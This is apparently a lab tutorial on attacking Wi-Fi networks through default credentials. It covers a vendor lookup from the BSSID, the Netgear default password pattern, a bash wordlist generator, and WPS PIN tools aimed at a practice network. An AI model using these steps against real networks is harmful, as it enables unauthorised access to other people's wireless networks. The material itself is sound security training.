
When assessing a wireless network, identifying whether the SSID is set to a factory default can provide valuable information. SSIDs that follow vendor-specific naming patterns, such as `Netgear05` or `Netgear50`, often expose the manufacturer. This knowledge allows us to investigate how default credentials are generated for that specific brand, which in turn helps us craft smarter, more targeted wordlists. If the SSID appears to be customized or does not clearly indicate the manufacturer, we can still attempt to determine the vendor by referencing public databases such as the IEEE OUI directory.

Default credentials are commonly obtained in two ways:

- By identifying the `vendor` and applying known default credentials or logic used by that vendor for password generation.
- By checking whether WPS (Wi-Fi Protected Setup) is enabled on the target network. If WPS is active, [wpspin](https://github.com/drygdryg/wpspin) can generate the default WPS PIN or possible WPS PINs, based on the network's BSSID

### Performing Vendor Lookup

By conducting a vendor lookup, we can increase the likelihood of discovering a valid password or WPS pin for the target access point. This approach takes advantage of known default credentials and password-generation schemes used by specific vendors. When used strategically, it can accelerate bruteforce efforts and lead to the successful retrieval of the WPA-PSK, granting access to the secured wireless network. To begin, we use `airodump-ng` to scan nearby wireless networks and identify our target. This scan provides important details such as the BSSID (MAC address) of the target network, which is required for further steps in the attack process.

```
airodump-ng wlan0mon -c 1 --essid HackTheBox-Wifi
```

```
grep -i "9C-C9-EB" /var/lib/ieee-data/oui.txt
```

#### Netgear Default Password Patterns

Netgear devices are known to use a specific format for their default passwords: `{adjective}{noun}{3 digits}`.

This results in passwords with a structure similar to the examples below:

- `sleeksalamander113`
- `abandonedelephant556`

These combinations are designed to be unique yet memorable. However, the predictability this introduces can be exploited during password cracking attempts.

```
git clone https://github.com/LivingInSyn/netgear_hashcat_wordlist.git
```

```
cd netgear_hashcat_wordlist/wordlists
```

```
#!/bin/bash

# Wordlists
wordlist1="adjectives.txt"
wordlist2="nouns.txt"
wordlist3="numbers.txt"

output="Netgear_Default.txt"

# Clear the output file if it exists
> "$output"

# adjective + noun + number
while IFS= read -r adj; do
  while IFS= read -r noun; do
    while IFS= read -r num; do
      echo "${adj}${noun}${num}" >> "$output"
    done < "$wordlist3"
  done < "$wordlist2"
done < "$wordlist1"
```

Instead of manually generating default Netgear passwords, we can leverage an existing tool developed by the community. The [Netgear Password Constructinator](https://github.com/redsquirrel7/Netgear-Password-Constructinator) by `redsquirrel7` automates the generation of potential default passwords used by Netgear routers. The `adjectives.txt` and `nouns.txt` files used by this script are significantly larger than those in other repositories. As a result, it generates a much larger wordlist, with a better chance of containing the correct default password.

```
python3 NPCinator.py > passwords.txt
```



